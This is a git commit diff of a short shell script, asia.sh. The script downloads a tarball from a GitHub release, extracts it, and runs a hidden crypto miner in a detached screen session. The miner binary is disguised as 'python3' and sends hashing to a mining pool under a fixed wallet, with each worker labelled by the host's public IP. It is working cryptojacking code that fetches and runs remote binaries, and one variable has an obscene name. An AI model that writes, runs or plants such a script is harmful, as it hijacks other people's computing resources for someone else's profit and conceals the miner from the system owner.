b6ec83c9e915f023ffd5d8a850c41d62b68d8c8e
DotAja <142836390+DotAja@users.noreply.github.com>
2024-09-30 23:12:22 +0700

    Update asia.sh

--- asia.sh
+++ asia.sh
@@ -1,18 +1,11 @@
 #!/bin/bash
 
-# Fungsi untuk menghasilkan nama acak dengan 5 huruf
-generate_random_name() {
-    tr -dc A-Za-z0-9 </dev/urandom | head -c 5
-}
-
-# Generate nama acak
-TID=$(generate_random_name)
-
 # Download file
 wget -q -O mek https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.gz
 
 # Extract file
 tar -xvf mek
 
+kontol=$(curl -s ifconfig.me)
 # Jalankan command dengan screen dan nama acak
-screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.DOT-AP-$TID
+screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.ASIA-$kontol
